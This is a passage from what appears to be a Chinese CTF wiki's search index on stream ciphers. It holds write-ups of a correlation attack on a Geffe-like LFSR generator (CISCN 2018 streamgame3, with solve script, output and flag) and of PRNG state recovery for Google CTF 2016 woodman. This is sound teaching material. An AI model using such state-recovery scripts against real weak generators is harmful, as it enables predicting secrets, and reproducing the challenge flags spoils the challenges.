\u949f\u63a7\u751f\u6210\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u8f93\u51fa\u6765\u63a7\u5236\u53e6\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u65f6\u949f","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/fsr/nfsr/#_3","text":"","title":"\u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_4","text":"\u7ec4\u5408\u751f\u6210\u5668\u4e00\u822c\u5982\u4e0b\u56fe\u6240\u793a\u3002","title":"\u7b80\u4ecb"},{"location":"crypto/streamcipher/fsr/nfsr/#geffe","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 Geffe \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002Geffe \u5305\u542b 3 \u4e2a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570\u4e3a F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3","title":"Geffe"},{"location":"crypto/streamcipher/fsr/nfsr/#2018-streamgame3","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 )[ 2 :]) == 17 assert len ( bin ( R2 )[ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = \"\" for i in range ( 1024 ): tmp1kb = \"\" for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb += tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u4e0e Geffe \u751f\u6210\u5668\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u76f8\u5173\u653b\u51fb\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u7edf\u8ba1\u4e00\u4e0b\u5728\u4e09\u4e2a LFSR \u8f93\u51fa\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u540e\u7c7b Geffe \u751f\u6210\u5668\u7684\u8f93\u51fa\uff0c\u5982\u4e0b x_1 x_1 x_2 x_2 x_3 x_3 F(x_1,x_2,x_3) F(x_1,x_2,x_3) 0 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 Geffe \u7684\u8f93\u51fa\u4e0e x_1 x_1 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 Geffe \u7684\u8f93\u51fa\u4e0e x_2 x_2 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.5 Geffe \u7684\u8f93\u51fa\u4e0e x_3 x_3 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 \u8fd9\u8bf4\u660e\u8f93\u51fa\u4e0e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a\u7684\u5173\u8054\u6027\u975e\u5e38\u5927\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u53bb\u679a\u4e3e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a LFSR \u7684\u8f93\u51fa\u5224\u65ad\u5176\u4e0e \u7c7b Geffe \u7684\u8f93\u51fa\u76f8\u7b49\u7684\u4e2a\u6570\uff0c\u5982\u679c\u5927\u7ea6\u5728 75% \u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u7b2c\u4e8c\u4e2a\u5c31\u76f4\u63a5\u66b4\u529b\u679a\u4e3e\u4e86\u3002 \u811a\u672c\u5982\u4e0b #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 res = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 ans: 1b9cb 5979c 16b2f3 \u4ece\u800c flag \u4e3a flag{01b9cb05979c16b2f3}\u3002","title":"2018 \u5f3a\u7f51\u676f streamgame3"},{"location":"crypto/streamcipher/fsr/nfsr/#_5","text":"2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/fsr/nfsr/#_6","text":"https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"\u53c2\u8003"},{"location":"crypto/streamcipher/lcg/challenge/","text":"\u9898\u76ee \u00b6 2016 Google CTF woodman \u00b6 \u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) \u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002 \u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c \uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002 a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002 a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002 a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002 a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002 \u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002 \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e \u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d \u3002 \u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002 \u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002 \u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b import os import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = y def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 << 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 << 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len(candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"\u4f8b\u9898"},{"location":"crypto/streamcipher/lcg/challenge/#_1","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/lcg/challenge/#2016-google-ctf-woodman","text":"\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) \u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002 \u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c \uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002 a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002 a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002 a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002 a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002 \u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002 \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e \u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d \u3002 \u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002 \u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002 \u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b import os import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = y def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 << 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 << 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len(candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"2016 Google CTF woodman"},{"location":"crypto/streamcipher/lcg/intro/","text":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668 \u00b6 \u5f85\u8865\u5145\u3002","title":"\u7b80\u4ecb"},{"location":"crypto/streamcipher/lcg/intro/#_1","text":"\u5f85\u8865\u5145\u3002","title":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/","text":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668 \u00b6 \u4ecb\u7ecd \u00b6 \u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG)\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002 \u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570 \u5bc6\u94a5\u751f\u6210 \u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0cIV\uff0c\u7528\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684 CBC\uff0cCFB\uff0cOFB \u6a21\u5f0f nounce\uff0c\u7528\u4e8e\u9632\u6b62\u91cd\u653e\u653b\u51fb\u4ee5\u53ca\u5206\u7ec4\u5bc6\u7801\u7684 CTR \u6a21\u5f0f\u7b49\u3001 one-time pads \u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 ECDSA \uff0c RSASSA-PSS \u9700\u6c42 \u00b6 \u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b \u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 next-bit test \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7 next-bit test 